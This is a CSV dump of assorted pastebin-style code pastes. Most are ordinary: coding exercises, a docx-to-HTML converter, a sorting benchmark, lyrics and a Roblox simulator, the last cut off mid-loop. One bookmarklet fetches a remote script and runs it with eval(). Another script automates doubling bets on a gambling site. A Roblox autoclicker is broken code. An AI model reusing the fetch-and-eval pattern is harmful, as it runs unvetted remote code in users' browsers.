id,title,username,language,date,content
Vm0crTYD,Count total set bits,jayati,C++,Tuesday 3rd of October 2023 12:51:55 AM CDT,"//{ Driver Code Starts
//Initial Template for C++

#include<bits/stdc++.h>
using namespace std;


// } Driver Code Ends
//User function Template for C++

class Solution{
    public:
    // n: input to count the number of set bits
    //Function to return sum of count of set bits in the integers from 1 to n.
    int findlargest(int num)
    {
        int x=0;
        while(1<<x <= num)
        {
            x++;
        }
        return x-1;
    }
    int countSetBits(int n)
    {
        if(n==0)
        {
            return 0;
        }
        int x=findlargest(n);
        int counttillx=(1<<(x-1))*x;
        int countafterx=(n-(1<<x))+1;
        int rest= (n-(1<<x));
        int ans=counttillx+countafterx+countSetBits(rest);
        return ans;
    }
};


//{ Driver Code Starts.

// Driver code
int main()
{
	 int t;
	 cin>>t;// input testcases
	 while(t--) //while testcases exist
	 {
	       int n;
	       cin>>n; //input n
	       Solution ob;
	       cout << ob.countSetBits(n) << endl;// print the answer
	  }
	  return 0;
}

// } Driver Code Ends"
NdF3M0Bk,detect and save Fonts and Paragraphs from docx to html,nicuf,Python,Tuesday 3rd of October 2023 12:38:29 AM CDT,"import docx

def run_get_style(run) -> str:
    if run.bold:
        return ""bold""
    elif run.italic:
        return ""italic""
    else:
        return ""normal""

def convert_docx_to_html_with_styles(document: docx.Document, output_file: str) -> None:
    with open(output_file, ""w"") as f:
        f.write(""<html>\n<body>\n"")
        current_style = None

        for paragraph in document.paragraphs:
            runs = paragraph.runs
            if not runs:
                continue

            for run in runs:
                run_style = run_get_style(run)

                if run_style == current_style:
                    f.write(run.text)
                else:
                    if current_style:
                        if current_style == ""bold"":
                            f.write(""</b>"")
                        elif current_style == ""italic"":
                            f.write(""</em>"")
                    if run_style == ""bold"":
                        f.write(""<b>"")
                    elif run_style == ""italic"":
                        f.write(""<em>"")

                    f.write(run.text)
                    current_style = run_style

            f.write(""<br>\n"")  # Adăugăm un salt de linie între paragrafe

        if current_style:
            if current_style == ""bold"":
                f.write(""</b>"")
            elif current_style == ""italic"":
                f.write(""</em>"")

        f.write(""</body>\n</html>"")

def main():
    document = docx.Document(""bebe.docx"")
    convert_docx_to_html_with_styles(document, ""bebe.html"")

if __name__ == ""__main__"":
    main()
"
PjT7G1Wr,song snowy,coinwalk,JavaScript,Tuesday 3rd of October 2023 12:34:13 AM CDT,"next time i feel I've a little ditty going through my head...
I'll find a means of attack to my very worse nightmares
seems like... they fall on deaf doors... and feed the souls... it will keep....
because life's got no turns but creepy
creepy vibes hits the doors of closed ears,
whack a mole on a stereo
its nice to dream...
been golden for my relatives .... they say nothing about what i can or did.... 
sometimes... i pray they don't fade away...
some time i pray they'd ring me just to see if I'm OK..
every time i see them they think i want something from them ..
its not always the case...
I'm probably their disgrace...
I'm torn outta place..
because life's no turns but creepy.
creepy vibes hits the doors of closed ears
whack a mole on a stereo
its nice to dream..."
8NsXZakj,TimeMemoryGenerator.sh,swear01,Bash,Tuesday 3rd of October 2023 12:11:51 AM CDT,"#!/usr/bin/bash

#############################################################################
# File       [ TimeMemoryGenerator.sh ]
# Author     [ Swear01 ]
# Synopsis   [ simple test for algorithm PA1 homework format program ]
# Date       [ 2020/10/01 ]
#############################################################################

# please ensure your code is right before use this
# please use this under PA1 folder


#SIZES = (1000 2000 4000 8000 16000 32000 1000000)
declare -a SIZES=(1000 2000 4000 8000 16000 32000 1000000)
declare -a CASE_ORDERS=(2 3 1)
declare -a METHODS=(IS MS QS RQS HS)


#init
make

echo -n ""data,"" > ram.csv
echo -n ""data,"" > cpu_time.csv

for method in ""${METHODS[@]}"" ; do
    echo -n ""$method,"" >> ram.csv
    echo -n ""$method,"" >> cpu_time.csv
done

echo "" "" >> ram.csv
echo "" "" >> cpu_time.csv

for size in ""${SIZES[@]}"" ; do
    for case_order in ""${CASE_ORDERS[@]}"" ; do
        echo -n ""$size"".case""$case_order,"" >> cpu_time.csv
        echo -n ""$size"".case""$case_order,"" >> ram.csv
        for method in ""${METHODS[@]}"" ; do
            echo current running -""$method"" inputs/""$size"".case""$case_order"".in
            bin/NTU_sort -""$method"" inputs/""$size"".case""$case_order"".in outputs/""$size"".case""$case_order"".out > tmp.txt
            #utility/PA1_Result_Checker inputs/""$size"".case""$case_order"".in outputs/""$size"".case""$case_order"".out 
            
            nums=($(grep -Eo '[0-9\.]+' tmp.txt))

            echo -n ""${nums[0]},"" >> cpu_time.csv
            echo -n ""${nums[1]},"" >> ram.csv
        done
        echo "" "" >> ram.csv
        echo "" "" >> cpu_time.csv
    done
done"
DiuFREBW,Untitled,Coolaidman,Python,Tuesday 3rd of October 2023 12:02:45 AM CDT,"{""embed"": {""title"": ""hey there how are you"", ""description"": ""this is a description""}}"
c7B2Bfqr,CC,Snorlax_6987,Lua,Monday 2nd of October 2023 11:26:45 PM CDT,"local currentSlot = 1

function findItems()
    local items = {}

    for itemSlot = 1, 16 do
        if turtle.getItemSpace(itemSlot) ~= 64 then
            table.insert(items, itemSlot)
        end
    end

    return items
end

function itemCheck()
    local itemTable = findItems()
    if #itemTable == 0 then
        return false
    end
    for _,itemSlot in pairs(itemTable) do
        currentSlot = itemSlot
        turtle.select(currentSlot)
        os.sleep(0.05)
        turtle.dropDown()
    end
end

local lastCheck = os.clock()

while true do
    local now = os.clock()
    turtle.attack()
    if now - lastCheck > 1 then
        lastCheck = now
        itemCheck()
    end
    os.sleep(0.25)
end"
HwzkuHYC,TP5_PUNTO3,FacundoCruz,Scilab,Monday 2nd of October 2023 10:39:18 PM CDT,"// --------------      Leer los datos del archivo de texto plano  -----------------

// obtener los datos de la curva 1

[pSupx,pSupy] = readarchivo('C:\Users\PC\Desktop\Calculo Numerico\TP5\curva 1.txt');
  
// obtener los datos de la curva 2

 [pInfx,pInfy] = readarchivo('C:\Users\PC\Desktop\Calculo Numerico\TP5\curva 2.txt');
  
// obtener los datos de la curva 3

 [pAlaSupx,pAlaSupy] = readarchivo('C:\Users\PC\Desktop\Calculo Numerico\TP5\curva 3.txt');
  

//Generar los trazadores cubicos
d1 = splin(pSupx,pSupy);
xx1 = linspace(pSupx(1),pSupx(length(pSupx)));
yy1 = interp(xx1,pSupx,pSupy,d1); //perfil superior

d2 = splin(pInfx,pInfy);
xx2 = linspace(pInfx(1),pInfx(length(pInfx)));
yy2 = interp(xx2,pInfx,pInfy,d2); //perfill inferior


d3 = splin(pAlaSupx,pAlaSupy);
xx3 = linspace(pAlaSupx(1),pAlaSupx(length(pAlaSupx)));
yy3 = interp(xx3,pAlaSupx,pAlaSupy,d3); //perfil ala superior


//Graficar perfil aproximado del snoopy
plot(xx1,yy1,'r')
plot(pSupx,pSupy,'bo')

plot(xx2,yy2)
plot(pInfx,pInfy,'ro')

plot(xx3,yy3,'k')
plot(pAlaSupx,pAlaSupy,'go')

xgrid(12)

title('Snoopy')"
xz28DA4D,Nigerian scammers [2-10-1/2023],bombaires,HTML,Monday 2nd of October 2023 10:32:52 PM CDT,"<a href=""mailto:financialconsultantroger@gmail.com"">financialconsultantroger@gmail.com</a>
<a href=""mailto:financialconsultantroger+26304@gmail.com"">financialconsultantroger+26304@gmail.com</a>
<a href=""mailto:financialconsultantroger+5504@gmail.com"">financialconsultantroger+5504@gmail.com</a>
<a href=""mailto:financialconsultantroger+26077@gmail.com"">financialconsultantroger+26077@gmail.com</a>
<a href=""mailto:financialconsultantroger+4997@gmail.com"">financialconsultantroger+4997@gmail.com</a>
<a href=""mailto:financialconsultantroger+31923@gmail.com"">financialconsultantroger+31923@gmail.com</a>
<a href=""mailto:financialconsultantroger+3874@gmail.com"">financialconsultantroger+3874@gmail.com</a>
<a href=""mailto:financialconsultantroger+12740@gmail.com"">financialconsultantroger+12740@gmail.com</a>
<a href=""mailto:financialconsultantroger+20662@gmail.com"">financialconsultantroger+20662@gmail.com</a>
<a href=""mailto:financialconsultantroger+26735@gmail.com"">financialconsultantroger+26735@gmail.com</a>
<a href=""mailto:financialconsultantroger+27397@gmail.com"">financialconsultantroger+27397@gmail.com</a>
<a href=""mailto:financialconsultantroger+22751@gmail.com"">financialconsultantroger+22751@gmail.com</a>
<a href=""mailto:financialconsultantroger+25817@gmail.com"">financialconsultantroger+25817@gmail.com</a>
<a href=""mailto:financialconsultantroger+6805@gmail.com"">financialconsultantroger+6805@gmail.com</a>
<a href=""mailto:financialconsultantroger+1239@gmail.com"">financialconsultantroger+1239@gmail.com</a>
<a href=""mailto:financialconsultantroger+16694@gmail.com"">financialconsultantroger+16694@gmail.com</a>
<a href=""mailto:financialconsultantroger+5987@gmail.com"">financialconsultantroger+5987@gmail.com</a>
<a href=""mailto:financialconsultantroger+13393@gmail.com"">financialconsultantroger+13393@gmail.com</a>
<a href=""mailto:financialconsultantroger+7359@gmail.com"">financialconsultantroger+7359@gmail.com</a>
<a href=""mailto:financialconsultantroger+15322@gmail.com"">financialconsultantroger+15322@gmail.com</a>
<a href=""mailto:financialconsultantroger+23164@gmail.com"">financialconsultantroger+23164@gmail.com</a>
<a href=""mailto:financialconsultantroger+30025@gmail.com"">financialconsultantroger+30025@gmail.com</a>
<a href=""mailto:financialconsultantroger+26325@gmail.com"">financialconsultantroger+26325@gmail.com</a>
<a href=""mailto:financialconsultantroger+23303@gmail.com"">financialconsultantroger+23303@gmail.com</a>
<a href=""mailto:financialconsultantroger+10613@gmail.com"">financialconsultantroger+10613@gmail.com</a>
<a href=""mailto:financialconsultantroger+13953@gmail.com"">financialconsultantroger+13953@gmail.com</a>
<a href=""mailto:financialconsultantroger+3183@gmail.com"">financialconsultantroger+3183@gmail.com</a>
<a href=""mailto:financialconsultantroger+20720@gmail.com"">financialconsultantroger+20720@gmail.com</a>
<a href=""mailto:financialconsultantroger+11304@gmail.com"">financialconsultantroger+11304@gmail.com</a>
<a href=""mailto:financialconsultantroger+9834@gmail.com"">financialconsultantroger+9834@gmail.com</a>
<a href=""mailto:financialconsultantroger+7051@gmail.com"">financialconsultantroger+7051@gmail.com</a>
<a href=""mailto:financialconsultantroger+19325@gmail.com"">financialconsultantroger+19325@gmail.com</a>
<a href=""mailto:financialconsultantroger+4361@gmail.com"">financialconsultantroger+4361@gmail.com</a>
<a href=""mailto:financialconsultantroger+3172@gmail.com"">financialconsultantroger+3172@gmail.com</a>
<a href=""mailto:financialconsultantroger+3213@gmail.com"">financialconsultantroger+3213@gmail.com</a>
<a href=""mailto:financialconsultantroger+12383@gmail.com"">financialconsultantroger+12383@gmail.com</a>
<a href=""mailto:financialconsultantroger+13014@gmail.com"">financialconsultantroger+13014@gmail.com</a>
<a href=""mailto:financialconsultantroger+27980@gmail.com"">financialconsultantroger+27980@gmail.com</a>
<a href=""mailto:financialconsultantroger+29542@gmail.com"">financialconsultantroger+29542@gmail.com</a>
<a href=""mailto:financialconsultantroger+23418@gmail.com"">financialconsultantroger+23418@gmail.com</a>
<a href=""mailto:financialconsultantroger+16510@gmail.com"">financialconsultantroger+16510@gmail.com</a>
<a href=""mailto:financialconsultantroger+15704@gmail.com"">financialconsultantroger+15704@gmail.com</a>
<a href=""mailto:financialconsultantroger+26561@gmail.com"">financialconsultantroger+26561@gmail.com</a>
<a href=""mailto:financialconsultantroger+15055@gmail.com"">financialconsultantroger+15055@gmail.com</a>
<a href=""mailto:financialconsultantroger+2645@gmail.com"">financialconsultantroger+2645@gmail.com</a>
<a href=""mailto:financialconsultantroger+13855@gmail.com"">financialconsultantroger+13855@gmail.com</a>
<a href=""mailto:financialconsultantroger+23778@gmail.com"">financialconsultantroger+23778@gmail.com</a>
<a href=""mailto:financialconsultantroger+1943@gmail.com"">financialconsultantroger+1943@gmail.com</a>
<a href=""mailto:financialconsultantroger+1294@gmail.com"">financialconsultantroger+1294@gmail.com</a>
<a href=""mailto:financialconsultantroger+15219@gmail.com"">financialconsultantroger+15219@gmail.com</a>
<a href=""mailto:financialconsultantroger+14225@gmail.com"">financialconsultantroger+14225@gmail.com</a>
<a href=""mailto:financialconsultantroger+3509@gmail.com"">financialconsultantroger+3509@gmail.com</a>
<a href=""mailto:financialconsultantroger+5696@gmail.com"">financialconsultantroger+5696@gmail.com</a>
<a href=""mailto:financialconsultantroger+5505@gmail.com"">financialconsultantroger+5505@gmail.com</a>
<a href=""mailto:financialconsultantroger+11834@gmail.com"">financialconsultantroger+11834@gmail.com</a>
<a href=""mailto:financialconsultantroger+30318@gmail.com"">financialconsultantroger+30318@gmail.com</a>
<a href=""mailto:financialconsultantroger+32489@gmail.com"">financialconsultantroger+32489@gmail.com</a>
<a href=""mailto:financialconsultantroger+27834@gmail.com"">financialconsultantroger+27834@gmail.com</a>
<a href=""mailto:financialconsultantroger+21983@gmail.com"">financialconsultantroger+21983@gmail.com</a>
<a href=""mailto:financialconsultantroger+30665@gmail.com"">financialconsultantroger+30665@gmail.com</a>
<a href=""mailto:financialconsultantroger+31641@gmail.com"">financialconsultantroger+31641@gmail.com</a>
<a href=""mailto:financialconsultantroger+7468@gmail.com"">financialconsultantroger+7468@gmail.com</a>
<a href=""mailto:financialconsultantroger+13268@gmail.com"">financialconsultantroger+13268@gmail.com</a>
<a href=""mailto:financialconsultantroger+24402@gmail.com"">financialconsultantroger+24402@gmail.com</a>
<a href=""mailto:financialconsultantroger+28461@gmail.com"">financialconsultantroger+28461@gmail.com</a>
<a href=""mailto:financialconsultantroger+31998@gmail.com"">financialconsultantroger+31998@gmail.com</a>
<a href=""mailto:financialconsultantroger+31875@gmail.com"">financialconsultantroger+31875@gmail.com</a>
<a href=""mailto:financialconsultantroger+17113@gmail.com"">financialconsultantroger+17113@gmail.com</a>
<a href=""mailto:financialconsultantroger+29612@gmail.com"">financialconsultantroger+29612@gmail.com</a>
<a href=""mailto:financialconsultantroger+19383@gmail.com"">financialconsultantroger+19383@gmail.com</a>
<a href=""mailto:financialconsultantroger+2019@gmail.com"">financialconsultantroger+2019@gmail.com</a>
<a href=""mailto:financialconsultantroger+20149@gmail.com"">financialconsultantroger+20149@gmail.com</a>
<a href=""mailto:financialconsultantroger+15455@gmail.com"">financialconsultantroger+15455@gmail.com</a>
<a href=""mailto:financialconsultantroger+14997@gmail.com"">financialconsultantroger+14997@gmail.com</a>
<a href=""mailto:financialconsultantroger+24965@gmail.com"">financialconsultantroger+24965@gmail.com</a>
<a href=""mailto:financialconsultantroger+12513@gmail.com"">financialconsultantroger+12513@gmail.com</a>
<a href=""mailto:financialconsultantroger+19471@gmail.com"">financialconsultantroger+19471@gmail.com</a>
<a href=""mailto:financialconsultantroger+1965@gmail.com"">financialconsultantroger+1965@gmail.com</a>
<a href=""mailto:financialconsultantroger+11230@gmail.com"">financialconsultantroger+11230@gmail.com</a>
<a href=""mailto:financialconsultantroger+14552@gmail.com"">financialconsultantroger+14552@gmail.com</a>
<a href=""mailto:financialconsultantroger+3831@gmail.com"">financialconsultantroger+3831@gmail.com</a>
<a href=""mailto:financialconsultantroger+9327@gmail.com"">financialconsultantroger+9327@gmail.com</a>
<a href=""mailto:financialconsultantroger+28530@gmail.com"">financialconsultantroger+28530@gmail.com</a>
<a href=""mailto:financialconsultantroger+6857@gmail.com"">financialconsultantroger+6857@gmail.com</a>
<a href=""mailto:financialconsultantroger+435@gmail.com"">financialconsultantroger+435@gmail.com</a>
<a href=""mailto:financialconsultantroger+4483@gmail.com"">financialconsultantroger+4483@gmail.com</a>
<a href=""mailto:financialconsultantroger+10934@gmail.com"">financialconsultantroger+10934@gmail.com</a>
<a href=""mailto:financialconsultantroger+23812@gmail.com"">financialconsultantroger+23812@gmail.com</a>
<a href=""mailto:financialconsultantroger+506@gmail.com"">financialconsultantroger+506@gmail.com</a>
<a href=""mailto:financialconsultantroger+12962@gmail.com"">financialconsultantroger+12962@gmail.com</a>
<a href=""mailto:financialconsultantroger+20788@gmail.com"">financialconsultantroger+20788@gmail.com</a>
<a href=""mailto:financialconsultantroger+30612@gmail.com"">financialconsultantroger+30612@gmail.com</a>
<a href=""mailto:financialconsultantroger+18919@gmail.com"">financialconsultantroger+18919@gmail.com</a>
<a href=""mailto:financialconsultantroger+28225@gmail.com"">financialconsultantroger+28225@gmail.com</a>
<a href=""mailto:financialconsultantroger+8931@gmail.com"">financialconsultantroger+8931@gmail.com</a>
<a href=""mailto:financialconsultantroger+4936@gmail.com"">financialconsultantroger+4936@gmail.com</a>
<a href=""mailto:financialconsultantroger+14379@gmail.com"">financialconsultantroger+14379@gmail.com</a>
<a href=""mailto:financialconsultantroger+7351@gmail.com"">financialconsultantroger+7351@gmail.com</a>
<a href=""mailto:financialconsultantroger+11500@gmail.com"">financialconsultantroger+11500@gmail.com</a>
<a href=""mailto:financialconsultantroger+28142@gmail.com"">financialconsultantroger+28142@gmail.com</a>
<a href=""mailto:financialconsultantroger+4784@gmail.com"">financialconsultantroger+4784@gmail.com</a>"
RkWwCBFb,diff.py,dyeske,Python,Monday 2nd of October 2023 10:25:37 PM CDT,"#!/usr/bin/env python
"""""" This takes unified diff output and adds colors """"""

from __future__ import print_function
import re
import sys

def main():
    """""" main routine """"""
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[0;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    ENDCOLOR = '\033[0m'
    added = 0
    deleted = 0

    try:
        for line in sys.stdin:
            if re.search('(^Index: .*)', line):
                line = ""%s%s%s"" % (BLUE, line, ENDCOLOR)
            elif re.search('(^\+\+\+ .*)', line):
                line = ""%s%s%s"" % (MAGENTA, line, ENDCOLOR)
            elif re.search('(^\+.*)', line):
                line = ""%s%s%s"" % (GREEN, line, ENDCOLOR)
                added = added + 1
            elif re.search('(^\-\-\- .*)', line):
                line = ""%s%s%s"" % (YELLOW, line, ENDCOLOR)
            elif re.search('(^\-.*)', line):
                line = ""%s%s%s"" % (RED, line, ENDCOLOR)
                deleted = deleted + 1
            else:
                pass
            sys.stdout.write(line)
        print('added ' + str(added) + ' deleted ' + str(deleted))
    except:
        print('exception')

if __name__ == '__main__':
    main()
"
GHUmxY4D,virtual autoclicker roblox |,404Coder,Lua,Monday 2nd of October 2023 10:06:50 PM CDT,"local VirtualUserInput = game.Player(""VirtualUserInput"")
local VirtualUserInput = game:GetInputService()
function InputService(inputservice)
    if InputService == Player.VirtualUserInput then
        VirtualUserInput.Player.mouse = game:GetVirtualUserMouse())
    if VirtualUserMouse then
        virtualUser.Mouse = mouse.player()
        end
    end
_G VirtualUserInput = true
game.VirtualUserInput = game.VirtualUserInput:GetMouse()
if VirtualUserInput == mouse2 and Player.Mouse == mouse1:Getmouse2 not mouse1
    if mouse2 == VirtualUserInput then
        _G autoclicker = true
        _G autoclicker.mouse2 = (""VirtualUserInput, mouse2"")
        end
    end
    end)
"
CN82b17J,Untitled,MrFast,Java,Monday 2nd of October 2023 09:42:12 PM CDT,"javascript:if(location.href==""https://ccccblackboard.blackboard.com/ultra/course"") {const scriptURL=""https://raw.githubusercontent.com/MrFast-js/SchoolTils/main/blackboard-todo-list.js"";fetch(scriptURL).then(t=>t.text()).then(scriptCode=>{eval(scriptCode)}).catch(t=>{console.error(""Error fetching or executing the script:"",t)})} else {location.href=""https://ccccblackboard.blackboard.com/ultra/course""};"
Atj5T41U,2. Buku David,firzaelbuho,C,Monday 2nd of October 2023 09:32:59 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

#define MAX_STACK_SIZE 7

struct Stack {
    char books[MAX_STACK_SIZE][100];
    int top;
};

// Inisialisasi stack
void initStack(struct Stack* stack) {
    stack->top = -1;
}

// Cek apakah stack kosong
bool isEmpty(struct Stack* stack) {
    return (stack->top == -1);
}

// Cek apakah stack penuh
bool isFull(struct Stack* stack) {
    return (stack->top == MAX_STACK_SIZE - 1);
}

// Menambahkan buku ke dalam stack (lemari)
void push(struct Stack* stack, const char* bookTitle) {
    if (!isFull(stack)) {
        stack->top++;
        strcpy(stack->books[stack->top], bookTitle);
        printf(""Buku '%s' berhasil ditambahkan ke dalam lemari.\n"", bookTitle);
    } else {
        printf(""Lemari sudah penuh, tidak bisa menambahkan buku.\n"");
    }
}

// Mengambil buku dari stack (lemari)
void pop(struct Stack* stack) {
    if (!isEmpty(stack)) {
        printf(""David mengambil buku '%s' dari lemari.\n"", stack->books[stack->top]);
        stack->top--;
    } else {
        printf(""Lemari sudah kosong, tidak ada buku yang dapat diambil.\n"");
    }
}

int main() {
    struct Stack lemariDavid;
    initStack(&lemariDavid);

    // Menambahkan buku-buku ke dalam lemari
    push(&lemariDavid, ""The Secret Garden"");
    push(&lemariDavid, ""The Catcher in the Rye"");
    push(&lemariDavid, ""Harry Potter and the Sorcerer's Stone"");
    push(&lemariDavid, ""To Kill a Mockingbird"");
    push(&lemariDavid, ""1984"");
    push(&lemariDavid, ""The Great Gatsby"");
    push(&lemariDavid, ""Pride and Prejudice"");

    // David mengambil buku-buku sesuai keinginannya
    pop(&lemariDavid); // Mengambil buku ""Pride and Prejudice""
    pop(&lemariDavid); // Mengambil buku ""The Great Gatsby""

    return 0;
}
"
xrjqai98,"1. Fungsi cetak 4,9,16",firzaelbuho,C++,Monday 2nd of October 2023 09:18:17 PM CDT,"#include <stdio.h>
#include <stdlib.h>

// Struktur untuk merepresentasikan node dalam linked list
struct Node {
    int data;
    struct Node* next;
};

// Fungsi untuk mencetak nilai 4, 9, dan 16 dari linked list
void cetakNilai(struct Node* head) {
    // Loop melalui linked list
    while (head != NULL) {
        if (head->data == 4 || head->data == 9 || head->data == 16) {
            // Cetak nilai yang diinginkan
            printf(""%d "", head->data);
        }
        head = head->next;
    }
}

int main() {
    // Membuat linked list sesuai dengan struktur yang diberikan
    struct Node* head = (struct Node*)malloc(sizeof(struct Node));
    head->data = 2;
    head->next = (struct Node*)malloc(sizeof(struct Node));
    head->next->data = 4;
    head->next->next = (struct Node*)malloc(sizeof(struct Node));
    head->next->next->data = 9;
    head->next->next->next = (struct Node*)malloc(sizeof(struct Node));
    head->next->next->next->data = 12;
    head->next->next->next->next = (struct Node*)malloc(sizeof(struct Node));
    head->next->next->next->next->data = 14;
    head->next->next->next->next->next = (struct Node*)malloc(sizeof(struct Node));
    head->next->next->next->next->next->data = 16;
    head->next->next->next->next->next->next = NULL;

    // Memanggil fungsi untuk mencetak nilai yang diinginkan
    cetakNilai(head);

    // Dealokasi memori
    while (head != NULL) {
        struct Node* temp = head;
        head = head->next;
        free(temp);
    }

    return 0;
}
"
ZQ1p63d6,snowybot good,coinwalk,JavaScript,Monday 2nd of October 2023 08:43:30 PM CDT,"var smmly = parseFloat(document.getElementById('pct_balance').value);
var nudle = Number((smmly/144000).toFixed(8));
var blert = nudle;
var taget = (smmly*7);
var bogs = (nudle*10);
var bpop = (nudle*6.5);
var piper = (nudle*7.5);
var circuit = 0;
var sysch = ((Math.floor(smmly/bogs))*bogs);
var sinch = ((Math.floor(smmly/bogs))*bogs);
var fatt = 1;
var distj = ((blert*1).toFixed(8));
var nemo = smmly;
var shit = smmly;
var wons = parseFloat(document.getElementById('wins').innerHTML);
var vons = parseFloat(document.getElementById('wins').innerHTML);
var loms = parseFloat(document.getElementById('losses').innerHTML);
var loon = parseFloat(document.getElementById('losses').innerHTML);
var brother = smmly;
var beboon = true;
 
function get(){
console.clear();
vons = document.getElementById('wins').innerHTML;
loon = document.getElementById('losses').innerHTML;
nemo = document.getElementById('pct_balance').value;
if ((nemo>shit)&&(vons>wons)&&(beboon)){
shit = parseFloat(nemo);
wons = parseFloat(vons);
}
if ((nemo<shit)&&(loon>loms)&&(beboon)){
shit = parseFloat(nemo);
loms = parseFloat(loon);
}
if ((vons>wons)&&(nemo<shit)&&(beboon)){
console.log('bet not verified counted green on reds');
return;
}
if ((loon>loms)&(nemo>shit)&&(beboon)){
console.log('bet not verified counted reds on green');
return;
}
if ((vons<wons)||(loon<loms)&&(beboon)){
console.log('bet not verified negative');
return;
}
if ((nemo>(((Math.floor(nemo/bogs))*bogs)+bpop))&&(nemo<(((Math.floor(nemo/bogs))*bogs)+piper))&&(nemo!=circuit)&&(nemo>sysch)) {
    blert = blert*2;
    circuit = parseFloat(nemo);
}
if ((nemo>(((Math.floor(nemo/bogs))*bogs)+bpop))&&(nemo<(((Math.floor(nemo/bogs))*bogs)+piper))&&(nemo!=circuit)&&(nemo<sysch)) {
    blert = blert*2;
    fatt = 0;
    circuit = parseFloat(nemo);
}
if ((nemo>=(sysch+(bogs*fatt)))&&(nemo<(((Math.floor(nemo/bogs))*bogs)+bpop))) { 
    blert = nudle;
    circuit = 0;
    fatt = 1;
    sysch = ((Math.floor((parseFloat(nemo))/bogs))*bogs);
}
    if (nemo >= taget) {
        console.log(""winner winner chicken dinner"");
        return;
    }
if ((nemo!=brother)&&(!beboon)){
brother = parseFloat(nemo);
beboon = true;
}
if ((nemo==brother)&&(beboon)){
razzle = ((blert*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(razzle);
$('#a_lo').click();
beboon = false;
}
var good = ((nemo-smmly).toFixed(8));
console.log(""profit"");
console.log(good);
setTimeout(() => get(), 10);
}
get();"
N1d65eKG,particle simulator,KrYn0MoRe,Lua,Monday 2nd of October 2023 08:25:13 PM CDT,"local part = Instance.new(""Part"")
part.Size = Vector3.new(10,10,1)
part.Position = Vector3.new(0,10,20)
part.Anchored = true
part.CanCollide = false
part.Parent = script

local surface = Instance.new(""SurfaceGui"")
surface.SizingMode = Enum.SurfaceGuiSizingMode.PixelsPerStud
surface.PixelsPerStud = 50
surface.Parent = part

local main = Instance.new(""Frame"")
main.Size = UDim2.new(1,0,1,0)
main.BorderSizePixel = 0
main.BackgroundColor3 = Color3.new(0,0,0)
main.ClipsDescendants = true
main.Parent = surface

local particle_list = {}
local groups = {}
local particle_data = {}

local scale = 10 -- size and velocity scaling
local mas = main.AbsoluteSize

function create_particle(x,y)
	x = x or 0
	y = y or 0
	
	local p = Instance.new(""Frame"")
	p.Size = UDim2.new(0,scale,0,scale)
	p.Position = UDim2.new(0,mas.X/2,0,mas.Y/2)+UDim2.new(0,x*scale,0,y*scale)
	p.BackgroundColor3 = Color3.new(1,1,1)
	p.Name = #particle_list+1
	p.BorderSizePixel = 0
	p.Parent = main
	
	particle_data[p] = {}
	particle_data[p].force = Vector2.new(0,0)
	particle_data[p].position = Vector2.new(p.Position.X.Offset,p.Position.Y.Offset)
	particle_data[p].mass = 1
	
	table.insert(particle_list,p)
end

function update_divs(divs)
	for _,div in pairs(divs) do
		for x = 0,div do
			groups[div][x] = {}

			for y = 0,div do
				groups[div][x][y] = 0

				local visualize = false

				if visualize then
					local p = Instance.new(""Frame"")
					p.Size = UDim2.new(3,0,0,1)
					p.Position = UDim2.new(0,mas.X/div*x,0,mas.Y/div*y)
					p.BackgroundColor3 = Color3.new(1,1,1)
					p.BackgroundTransparency = .9
					p.BorderSizePixel = 0
					p.Parent = main

					local p = Instance.new(""Frame"")
					p.Size = UDim2.new(0,1,3,0)
					p.Position = UDim2.new(0,mas.X/div*x,0,mas.Y/div*y)
					p.BackgroundColor3 = Color3.new(1,1,1)
					p.BackgroundTransparency = .9
					p.BorderSizePixel = 0
					p.Parent = main
				end
			end
		end
	end
	for i,v in ipairs(particle_list) do -- first establish group population
		local pos = v.Position
		for _,div in pairs(divs) do
			local x = math.floor(pos.X.Offset/mas.X*div)
			local y = math.floor(pos.Y.Offset/mas.Y*div)
			
			if div > x and div > y and x > 0 and y > 0 then
				groups[div][x][y] += 1 -- increase population in group area
			end
		end
	end
end

function update_groups()
	local divs = {60,40,20}
	local total_div = 0
	
	for _,div in pairs(divs) do
		total_div += div
		groups[div] = {}
	end
	update_divs(divs)
	
	for i,v in ipairs(particle_list) do -- update colors
		local pos = v.Position
		
		local pop = 0
		
		for _,div in pairs(divs) do
			local x = math.floor(pos.X.Offset/mas.X*div)
			local y = math.floor(pos.Y.Offset/mas.Y*div)

			if div > x and div > y and x > 0 and y > 0 then
				local divpop = groups[div][x][y]
				pop += divpop^2/(mas.X/div)
			end
		end

		local radiance = pop
		v.BackgroundColor3 = Color3.new(radiance,radiance,radiance)
		--v.BackgroundColor3 = Color3.new(0.4+radiance*0.4,0.8-radiance*0.4,0.8-radiance*0.4)
	end
	
	--[[ -- supposed to update gravity with large amounts of particles but im lazy to add
	for _,p in ipairs(particle_list) do -- update gravity
		local pos = p.Position
		
		local force = 0
		
		for _,div in pairs(divs) do
			local x = math.floor(pos.X.Offset/mas.X*div)
			local y = math.floor(pos.Y.Offset/mas.Y*div)
			
			if div > x and div > y and x > 0 and y > 0 then
				local divpop = groups[div][x][y]
				force += divpop/(mas.X/div) -- all the particles have mass of 1, no extra steps
			end
		end

		local p_vec = Vector2.new(p.Position.X.Offset,p.Position.Y.Offset)
		local new_vec = p_vec+force

		p.Position = UDim2.new(0,new_vec.X,0,new_vec.Y)
	end
	]]
end

function update_particle(p)
	local G = 6.67408 * 10^-4--1/1000
	for i,v in ipairs(particle_list) do
		if v ~= p then
			local m1 = particle_data[p].mass
			local m2 = particle_data[v].mass
			local p_vec = particle_data[p].position
			local v_vec = particle_data[v].position
			local force_vec = v_vec-p_vec
			local r = force_vec.Magnitude
			local F = G*(m1*m2)/r^2
			local A = F/m1
			if r > 0 then
				force_vec = force_vec*A
			end
			force_vec = particle_data[p].force+force_vec
			particle_data[p].force = force_vec

			local new_vec = p_vec+force_vec
			particle_data[p].position = new_vec
			--p.Position = UDim2.new(0,new_vec.X,0,new_vec.Y)
		end
	end
end

function update_sim()
	for _,p in ipairs(particle_list) do
		update_particle(p)
	end
	for _,p in ipairs(particle_list) do
		local new_vec = particle_data[p].position
		p.Position = UDim2.new(0,new_vec.X,0,new_vec.Y)
	end
	update_groups()
end

local mx = 15
local my = 15

for x = 1,mx do
	for y = 1,my do
		create_particle((-mx*2/2)+x*2,(-my*2/2)+y*2)
	end
end

update_groups()

task.wait(3)

while true do
